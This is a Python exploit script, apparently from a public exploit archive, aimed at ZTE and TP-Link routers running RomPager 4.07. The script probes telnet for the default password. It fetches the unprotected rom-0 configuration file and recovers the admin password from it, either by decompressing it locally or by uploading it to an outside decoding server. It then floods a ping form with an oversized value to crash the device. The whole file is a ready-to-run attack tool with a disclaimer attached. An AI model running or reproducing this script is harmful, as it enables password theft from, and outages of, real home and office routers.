#!/usr/bin/env python
# -*- coding: utf-8 -*- 

# Exploit Title: ZTE and TP-Link RomPager DoS Exploit
# Date: 10-05-2014
# Server Version: RomPager/4.07 UPnP/1.0
# Tested Routers: 	ZTE ZXV10 W300
#					TP-Link TD-W8901G
#					TP-Link TD-W8101G
#					TP-Link TD-8840G
# Firmware: FwVer:3.11.2.175_TC3086 HwVer:T14.F7_5.0
# Tested on: Kali Linux x86
#
# Notes:	Please note this exploit may contain errors, and
#			is provided "as it is". There is no guarantee
#			that it will work on your target router(s), as
#			the code may have to be adapted. 
#			This is to avoid script kiddie abuse as well.
#
# Disclaimer: This proof of concept is strictly for research, educational or ethical (legal) purposes only.
#			  Author takes no responsibility for any kind of damage you cause.
#
# Exploit Author: Osanda Malith Jayathissa (@OsandaMalith)
#
# Original write-up: https://osandamalith.wordpress.com/2014/06/10/zte-and-tp-link-rompager-dos/
# Video: https://www.youtube.com/watch?v=1fSECo2ewoo
# Dedicate to Nick Knight and Hood3dRob1n
#  
# ./dos.py -i 192.168.1.1

import os
import re
import sys
import time
import urllib
import base64
import httplib
import urllib2
import requests
import optparse
import telnetlib
import subprocess
import collections
import unicodedata
 
class BitReader:
	
    def __init__(self, bytes):
        self._bits = collections.deque()
        
        for byte in bytes:
            byte = ord(byte)
            for n in xrange(8):
                self._bits.append(bool((byte >> (7-n)) & 1))
            
    def getBit(self):
        return self._bits.popleft()
        
    def getBits(self, num):
        res = 0
        for i in xrange(num):
            res += self.getBit() << num-1-i
        return res
        
    def getByte(self):
        return self.getBits(8)
        
    def __len__(self):
        return len(self._bits)
        
class RingList:
	
    def __init__(self, length):
        self.__data__ = collections.deque()
        self.__full__ = False
        self.__max__ = length
 
    def append(self, x):
        if self.__full__:
            self.__data__.popleft()
        self.__data__.append(x)
        if self.size() == self.__max__:
            self.__full__ = True
 
    def get(self):
        return self.__data__
 
    def size(self):
        return len(self.__data__)
 
    def maxsize(self):
        return self.__max__
        
    def __getitem__(self, n):
        if n >= self.size():
            return None
        return self.__data__[n]

def filter_non_printable(str):
  return ''.join([c for c in str if ord(c) > 31 or ord(c) == 9])


def banner():
	return '''

\t\t    _/_/_/                _/_/_/   
\t\t   _/    _/    _/_/    _/          
\t\t  _/    _/  _/    _/    _/_/       
\t\t _/    _/  _/    _/        _/      
\t\t_/_/_/      _/_/    _/_/_/         
                           
 '''                          
def dos(host, password):
	while (1):
		url = 'http://' +host+ '/Forms/tools_test_1'
		parameters = {
		'Test_PVC'			:	'PVC0', 
		'PingIPAddr'		:	'\101'*2000,
		'pingflag'			:	'1',
		'trace_open_flag'	:	'0',
		'InfoDisplay'		:	'+-+Info+-%0D%0A'
		}
		
		params = urllib.urlencode(parameters) 
		
		req = urllib2.Request(url, params) 
		base64string = base64.encodestring('%s:%s' % ('admin', password)).replace('\n', '')
		req.add_header("Authorization", "Basic %s" %base64string)
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		req.add_header("Referer", "http://" +host+ "/maintenance/tools_test.htm")
		try:
				print '[~] Sending Payload'	
				response = urllib2.urlopen(req, timeout=1)
				sys.exit(0)
			
		except:
			flag = checkHost(host)
			if flag == 0:
				print '[+] The host is still up and running'
			else:
				print '[~] Success! The host is down'
				sys.exit(0)
				break

def checkHost(host):
	if sys.platform == 'win32':
		c = "ping -n 2 " + host
	else:
		c = "ping -c 2 " + host

	try:
		x = subprocess.check_call(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		time.sleep(1)
		return x
		
	except:
		pass

def checkServer(host):
	connexion = httplib.HTTPConnection(host)
	connexion.request("GET", "/status.html")
	response = connexion.getresponse()
	server = response.getheader("server")
	connexion.close()
	time.sleep(2)
	if server == 'RomPager/4.07 UPnP/1.0':
		return 0
	else:
		return 1

def checkPassword(host):
	print '[+] Checking for default password'
	defaultpass = 'admin'
	tn = telnetlib.Telnet(host, 23, 4)
	tn.read_until("Password: ")
	tn.write(defaultpass + '\n')
	time.sleep(2)
	banner = tn.read_eager()
	banner = regex(len(defaultpass)*r'.'+'\w+' , banner)
	tn.write("exit\n")
	tn.close()
	time.sleep(4)
	if banner == 'Copyright':
		print '[+] Default password is being used'
		dos(host, defaultpass)
	else:
		print '[!] Default Password is not being used'
	while True:
		msg = str(raw_input('[?] Decrypt the rom-0 file locally? ')).lower()
		try:
			if msg[0] == 'y':
				password = decodePasswordLocal(host)
				print '[*] Router password is: ' +password
				dos(host, password)
				break			        
			if msg[0] == 'n':
				password = decodePasswordRemote(host)
				print '[*] Router password is: ' +password
				dos(host, password)
				break
			else:
				print '[!] Enter a valid choice'
		except Exception, e:
				print e
				continue
		

def decodePasswordRemote(host):
	fname = 'rom-0'
	if os.path.isfile(fname) == True:
		os.remove(fname)
	urllib.urlretrieve ("http://"+host+"/rom-0", fname)
	# If this URL goes down you might have to find one and change this function. 
	# You can also use the local decoder. It might have few errors in getting output.
	url = 'http://198.61.167.113/zynos/decoded.php'                # Target URL
	files = {'uploadedfile': open('rom-0', 'rb') }                 # The rom-0 file we wanna upload
	data = {'MAX_FILE_SIZE': 1000000, 'submit': 'Upload rom-0'}    # Additional Parameters we need to include
	headers = { 'User-agent' : 'Python Demo Agent v1' }            # Any additional Headers you want to send or include

	res = requests.post(url, files=files, data=data, headers=headers, allow_redirects=True, timeout=30.0, verify=False )
	res1 =res.content
	p = re.search('rows=10>(.*)', res1)
	if p:
		passwd = found = p.group(1)
	else:
		password = 'NotFound'
	return passwd

def decodePasswordLocal(host):
	# Sometimes this might output a wrong password while finding the exact string. 
	# print the result as mentioned below and manually find out
	fname = 'rom-0'
	if os.path.isfile(fname) == True:
		os.remove(fname)
	urllib.urlretrieve ("http://"+host+"/rom-0", fname)
	fpos=8568
	fend=8788
	fhandle=file('rom-0')
	fhandle.seek(fpos)
	chunk="*"
	amount=221
	while fpos < fend:
	    if fend-fpos < amount:
	        amount = amount
	        data = fhandle.read(amount)
	        fpos += len(data)
	        
	reader = BitReader(data)
	result = ''
	   
	window = RingList(2048)
	    
	while True:
	    bit = reader.getBit()
	    if not bit:
	        char = reader.getByte()
	        result += chr(char)
	        window.append(char)
	    else:
	        bit = reader.getBit()
	        if bit:
	            offset = reader.getBits(7)
	            if offset == 0:
	                break
	        else:
	            offset = reader.getBits(11)
	        
	        lenField = reader.getBits(2)
	        if lenField < 3:
	            lenght = lenField + 2
	        else:
	            lenField <<= 2
	            lenField += reader.getBits(2)
	            if lenField < 15:
	                lenght = (lenField & 0x0f) + 5
	            else:
	                lenCounter = 0
	                lenField = reader.getBits(4)
	                while lenField == 15:
	                    lenField = reader.getBits(4)
	                    lenCounter += 1
	                lenght = 15*lenCounter + 8 + lenField
	        
	        for i in xrange(lenght):
	            char = window[-offset]
	            result += chr(char)
	            window.append(char)

	result = filter_non_printable(result).decode('unicode_escape').encode('ascii','ignore')
	# In case the password you see is wrong while filtering, manually print it from here and findout. 
	#print result 
	if 'TP-LINK' in result:
	    result = ''.join(result.split()).split('TP-LINK', 1)[0] + 'TP-LINK';
	    result = result.replace("TP-LINK", "")
	    result = result[1:]

	if 'ZTE' in result:
	    result = ''.join(result.split()).split('ZTE', 1)[0] + 'ZTE';
	    result = result.replace("ZTE", "")
	    result = result[1:]

	if 'tc160' in result:
	    result = ''.join(result.split()).split('tc160', 1)[0] + 'tc160';
	    result = result.replace("tc160", "")
	    result = result[1:]
	return result
	
def regex(path, text):
	match = re.search(path, text)
	if match:
		return match.group()
	else:
		return None

def main():
	if sys.platform == 'win32':
		os.system('cls')
	else:
		os.system('clear')
	try:
		print banner()
		print '''
|=--------=[ ZTE and TP-Link RomPager Denial of Service Exploit ]=-------=|\n
[*] Author: Osanda Malith Jayathissa
[*] Follow @OsandaMalith
[!] Disclaimer: This proof of concept is strictly for research, educational or ethical (legal) purposes only.
[!] Author takes no responsibility for any kind of damage you cause.

	'''
		parser = optparse.OptionParser("usage: %prog -i <IP Address> ")
		parser.add_option('-i', dest='host', 
							type='string',	
							help='Specify the IP to attack')
		(options, args) = parser.parse_args()
		
		if options.host is None:
			parser.print_help()
			exit(-1)

		host = options.host
		x = checkHost(host)

		if x == 0:
			print '[+] The host is up and running'
			server = checkServer(host)
			if server == 0:
				checkPassword(host)
			else:
				print ('[!] Sorry the router is not running RomPager')
		else:
			print '[!] The host is not up and running'
			sys.exit(0)

	except KeyboardInterrupt:
		print '[!] Ctrl + C detected\n[!] Exiting'
		sys.exit(0)
	except EOFError:
		print '[!] Ctrl + D detected\n[!] Exiting'
		sys.exit(0)

if __name__ == "__main__": 
    main()  
#EOF